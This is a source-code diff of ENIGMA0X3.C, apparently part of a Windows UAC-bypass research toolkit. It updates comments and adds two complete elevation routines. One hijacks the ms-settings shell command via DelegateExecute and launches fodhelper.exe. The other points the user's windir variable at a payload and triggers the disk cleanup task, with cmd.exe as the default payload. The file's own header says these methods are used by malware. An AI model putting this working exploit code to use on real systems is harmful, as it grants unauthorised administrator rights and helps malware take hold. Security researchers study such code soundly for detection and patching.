@@ -4,11 +4,13 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.72
 *
-*  DATE:        01 May 2017
+*  DATE:        26 May 2017
 *
-*  Enigma0x3 autoelevation methods.
+*  Enigma0x3 autoelevation methods and everything based on the same
+*  ShellExecute related registry manipulations idea.
+*
 *  Used by various malware.
 *
 *  For description please visit original URL
@@ -16,6 +18,8 @@
 *  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
 *  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
 *  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/
+*  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
+*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -98,10 +102,13 @@ BOOL ucmHijackShellCommandMethod(
         if (lResult != ERROR_SUCCESS)
             break;
 
+        //
+        // Set "Default" value as our payload.
+        //
         sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
         lResult = RegSetValueEx(
             hKey,
-            L"",
+            TEXT(""),
             0,
             REG_SZ,
             (BYTE*)lpBuffer,
@@ -256,6 +263,7 @@ DWORD ucmDiskCleanupWorkerThread(
 * Use cleanmgr innovation implemented in Windows 10+.
 * Cleanmgr.exe uses full copy of dismhost.exe from local %temp% directory.
 * RC friendly.
+* Warning: this method works with AlwaysNotify UAC level.
 *
 */
 BOOL ucmDiskCleanupRaceCondition(
@@ -385,13 +393,13 @@ BOOL ucmAppPathMethod(
             lpKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
 
         //
-        // Set default value as our payload executable.
+        // Set "Default" value as our payload.
         //
         if (lResult == ERROR_SUCCESS) {
             sz = (1 + _strlen(lpBuffer)) * sizeof(WCHAR);
             lResult = RegSetValueEx(
                 hKey,
-                L"",
+                TEXT(""),
                 0,
                 REG_SZ,
                 (BYTE*)lpBuffer,
@@ -434,6 +442,12 @@ BOOL ucmAppPathMethod(
 *
 * Use IsolatedCommand value of exefile shell command for your payload.
 * Trigger: sdclt.exe with /kickoffelev param (force it to use ShellExecuteEx)
+*
+* Additional triggers:
+* (they won't be included because they are basically all the same)
+*
+*                        rstrui.exe with /runonce param
+*                        SystemSettingsAdminFlows.exe with PushButtonReset param
 *
 */
 BOOL ucmSdcltIsolatedCommandMethod(
@@ -496,8 +510,8 @@ BOOL ucmSdcltIsolatedCommandMethod(
             T_ISOLATEDCOMMAND,
             0, REG_SZ,
             (BYTE*)lpBuffer,
-            cbData
-        );
+            cbData);
+
         if (lResult == ERROR_SUCCESS) {
             _strcpy(szBuffer, g_ctx.szSystemDirectory);
             _strcat(szBuffer, SDCLT_EXE);
@@ -527,6 +541,174 @@ BOOL ucmSdcltIsolatedCommandMethod(
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
+
+    return bResult;
+}
+
+/*
+* ucmMsSettingsDelegateExecuteMethod
+*
+* Purpose:
+*
+* Overwrite Default value of ms-settings shell command with your payload.
+* Enable it with DelegateExecute value.
+*
+* Trigger: fodhelper.exe
+*
+*/
+BOOL ucmMsSettingsDelegateExecuteMethod(
+    _In_opt_ LPWSTR lpszPayload
+)
+{
+    BOOL    bResult = FALSE, bCond = FALSE;
+    DWORD   cbData;
+    SIZE_T  sz = 0;
+    LRESULT lResult;
+#ifndef _WIN64
+    PVOID   OldValue;
+#endif
+    LPWSTR  lpBuffer = NULL;
+    HKEY    hKey = NULL;
+
+    WCHAR szBuffer[MAX_PATH + 1];
+    WCHAR szKey[MAX_PATH + 1];
+
+    //
+    // Trigger application doesn't exist in wow64.
+    //
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
+            return FALSE;
+    }
+#endif
+
+    do {
+
+        if (lpszPayload != NULL) {
+            lpBuffer = lpszPayload;
+            sz = _strlen(lpszPayload);
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            sz = _strlen(szBuffer);
+            lpBuffer = szBuffer;
+        }
+
+        _strcpy(szKey, T_MSSETTINGS);
+        _strcat(szKey, T_SHELL_OPEN_COMMAND);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set empty DelegateExecute value.
+        //
+        szKey[0] = 0;
+        cbData = 0;
+        lResult = RegSetValueEx(
+            hKey,
+            T_DELEGATEEXECUTE,
+            0, REG_SZ,
+            (BYTE*)szKey,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set "Default" value as our payload.
+        //
+        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+
+        lResult = RegSetValueEx(
+            hKey,
+            TEXT(""),
+            0, REG_SZ,
+            (BYTE*)lpBuffer,
+            cbData);
+
+        if (lResult == ERROR_SUCCESS) {
+            _strcpy(szBuffer, g_ctx.szSystemDirectory);
+            _strcat(szBuffer, FODHELPER_EXE);
+            bResult = supRunProcess(szBuffer, NULL);
+            supDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSSETTINGS);
+        }
+
+    } while (bCond);
+
+    if (hKey != NULL)
+        RegCloseKey(hKey);
+
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    }
+#endif
+
+    return bResult;
+}
+
+/*
+* ucmDiskCleanupEnvironmentVariable
+*
+* Purpose:
+*
+* Use cleanmgr innovation implemented in Windows 10+.
+* Cleanmgr.exe uses current user environment variables to build a path to the executable task.
+* Warning: this method works with AlwaysNotify UAC level.
+*
+*/
+BOOL ucmDiskCleanupEnvironmentVariable(
+    _In_opt_ LPWSTR lpszPayload
+)
+{
+    BOOL    bResult = FALSE, bCond = FALSE;
+    LPWSTR  lpBuffer = NULL;
+    WCHAR   szBuffer[MAX_PATH + 1];
+    WCHAR   szEnvVariable[MAX_PATH * 2];
+
+    do {
+
+        if (lpszPayload != NULL) {
+            lpBuffer = lpszPayload;
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            lpBuffer = szBuffer;
+        }
+
+        //
+        // Add quotes.
+        //
+        szEnvVariable[0] = L'\"';
+        szEnvVariable[1] = 0;
+        _strncpy(&szEnvVariable[1], MAX_PATH, lpBuffer, MAX_PATH);
+        _strcat(szEnvVariable, L"\"");
+
+        //
+        // Set our controlled env.variable with payload.
+        //
+        if (!supSetEnvVariable(FALSE, T_WINDIR, szEnvVariable))
+            break;
+
+        //
+        // Run trigger task.
+        //
+        bResult = supRunProcess(SCHTASKS_EXE, T_SCHTASKS_CMD);
+
+        //
+        // Cleaup our env.variable.
+        //
+        supSetEnvVariable(TRUE, T_WINDIR, NULL);
+
+    } while (bCond);
 
     return bResult;
 }
